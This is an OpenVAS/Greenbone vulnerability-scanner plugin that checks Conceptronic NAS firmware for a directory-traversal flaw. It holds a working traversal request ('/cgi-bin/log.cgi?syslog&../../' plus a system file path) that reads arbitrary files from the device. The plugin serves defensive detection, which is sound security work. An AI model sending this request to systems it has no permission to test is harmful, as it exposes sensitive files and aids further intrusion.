if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103563" );
	script_bugtraq_id( 55369 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Multiple Conceptronic Products Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55369" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-09-12 12:56:11 +0200 (Wed, 12 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Multiple Conceptronic products are prone to a directory-traversal
  vulnerability." );
	script_tag( name: "impact", value: "A remote attacker could exploit the vulnerability using directory-
  traversal characters ('../') to access arbitrary files that contain
  sensitive information that could aid in further attacks." );
	script_tag( name: "affected", value: "Conceptronic Home Media Store CH3ENAS Firmware 3.0.12 Conceptronic

  Dual Bay Home Media Store CH3HNAS Firmware 2.4.13" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(http_vuln_check( port: port, url: "/login.htm", pattern: "(Conceptronic|CH3HNAS|CH3ENAS)", usecache: TRUE )){
	files = traversal_files( "linux" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/cgi-bin/log.cgi?syslog&../../" + file + "&Conceptronic2009";
		if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

